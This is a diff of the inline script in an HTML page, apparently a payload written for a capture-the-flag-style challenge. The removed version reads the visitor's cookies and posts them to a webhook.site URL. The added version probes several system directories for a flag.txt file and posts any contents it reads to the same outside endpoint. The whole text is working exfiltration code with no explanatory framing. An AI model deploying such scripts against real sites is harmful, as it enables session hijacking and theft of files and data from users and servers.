@@ -3,14 +3,37 @@
 </head>
 <body>
     <script>
-        // Capture the document cookie
-        var userCookie = document.cookie;
+        // Array of directories to search
+        var directories = [
+            "/",
+            "/home/",
+            "/usr/",
+            "/var/",
+            "/etc/",
+            "/opt/"
+        ];
 
-        // Send the cookie to your webhook
-        var xhr = new XMLHttpRequest();
-        xhr.open('POST', 'https://webhook.site/036cf903-e785-4967-8ac6-83104bba907b', true);
-        xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
-        xhr.send('cookie=' + encodeURIComponent(userCookie));
+        // Function to attempt reading a file
+        function readFile(directory) {
+            var xhr = new XMLHttpRequest();
+            xhr.onload = function() {
+                if (this.status === 200) { // File exists and is readable
+                    // Send the file content to your webhook
+                    var sendXhr = new XMLHttpRequest();
+                    sendXhr.open('POST', 'https://webhook.site/036cf903-e785-4967-8ac6-83104bba907b', true);
+                    sendXhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
+                    sendXhr.send('file=' + encodeURIComponent(directory + "flag.txt") + '&data=' + encodeURIComponent(this.responseText));
+                }
+            };
+            // Try to read the file
+            xhr.open("GET", directory + "flag.txt", true);
+            xhr.send();
+        }
+
+        // Iterate over directories
+        for (var i = 0; i < directories.length; i++) {
+            readFile(directories[i]);
+        }
     </script>
 </body>
 </html>
